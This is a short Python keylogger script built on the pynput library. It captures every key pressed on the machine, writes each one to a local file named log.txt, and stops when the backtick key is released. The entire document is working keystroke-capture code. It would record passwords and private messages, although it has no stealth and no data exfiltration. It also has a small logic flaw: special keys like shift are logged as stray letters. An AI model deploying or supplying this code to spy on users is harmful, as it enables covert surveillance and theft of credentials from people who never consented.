import pynput
from pynput.keyboard import Key, Listener
import os

def press(key):
    if os.path.exists('log.txt'):
        logFile = open('log.txt', 'a+')
    else: logFile = open('log.txt', 'w+')

    k = str(key)
    if key != pynput.keyboard.KeyCode(char='`'):
        if key == Key.enter:
            logFile.write('\n')
            logFile.close()
        elif key == Key.backspace:
            logFile.write('\n')
            logFile.write('<BACKSPACE>')
            logFile.close()
        elif key == Key.space:
            logFile.write(' ')
            logFile.close()
        else:
            logFile.write(k[1])
            logFile.close()

def release(key):
    if key == pynput.keyboard.KeyCode(char='`'):
        return False

with Listener(on_press=press, on_release=release) as l:
    l.join()